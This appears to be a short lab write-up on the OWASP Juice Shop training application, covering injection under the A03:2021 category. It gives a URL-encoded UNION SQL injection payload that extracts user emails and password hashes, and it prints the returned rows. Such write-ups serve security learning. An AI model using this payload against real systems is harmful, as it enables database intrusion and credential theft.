# A3-2021 - Injection

## Overview
[Injection](https://owasp.org/Top10/A03_2021-Injection/) vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. This happens when user-supplied data is not properly validated, filtered, or sanitized before being processed by the application. Injection flaws are particularly dangerous because they can allow attackers to execute unintended commands or access data without proper authorization.

The most common types of injection attacks include SQL injection, NoSQL injection, OS command injection, and LDAP injection. These vulnerabilities arise when applications construct queries or commands by concatenating user input directly into the query string, rather than using parameterized queries or prepared statements.

Injection attacks can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability, denial of access, and sometimes complete host takeover. The business impact depends on the needs of the application and data protection requirements, but injection vulnerabilities are consistently found in applications and can be devastating when successfully exploited.

## Reconaisence

## Exploit

After much trial and error, settled on this url-encoded injection.

`'))%20union%20all%20select%201,email,username,4,password,6,7,8,9%20from%20Users%20--%20`. This returned items from the shop, but it also returned at the end of the waht looked like users.

```json
// snippet
{"id":46,"name":"DSOMM & Juice Shop User Day Ticket","description":"You are going to the OWASP Global AppSec San Francisco 2024? <a href=\"https://www.eventbrite.com/e/owasp-global-appsec-san-francisco-2024-tickets-723699172707\" target=\"_blank\">Get a ticket*</a> for this amazing side event as well! Check the juice-packed agenda <a href=\"https://owasp.org/www-project-juice-shop/#div-userday2024\" target=\"_blank\">here</a> for all the details!<br /><br />*=scroll down to <strong>Elevate: DSOMM and Juice Shop User Day (Sept. 25)</strong> after clicking <em>Get Tickets</em> on Eventbrite. Ticket price set to only covers fees for room, AV, and catering throughout the day.","price":55.2,"deluxePrice":55.2,"image":"user_day_ticket.png","createdAt":"2025-06-09 11:30:05.779 +00:00","updatedAt":"2025-06-09 11:30:05.779 +00:00","deletedAt":"2025-06-09 11:30:06.552 +00:00"},{"id":1,"name":"admin@juice-sh.op","description":"","price":4,"deluxePrice":"0192023a7bbd73250516f069df18b500","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"jim@juice-sh.op","description":"","price":4,"deluxePrice":"e541ca7ecf72b8d1286474fc613e5e45","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bender@juice-sh.op","description":"","price":4,"deluxePrice":"0c36e517e3fa95aabf1bbffc6744a4ef","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern.kimminich@gmail.com","description":"bkimminich","price":4,"deluxePrice":"6edd9d726cbdc873c539e41ae8757b8c","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},```

SQL injection to return user information was possible. This exploit on it own can be devastating, but paired with cryptographic failures, this exploit chain becomes much worse.
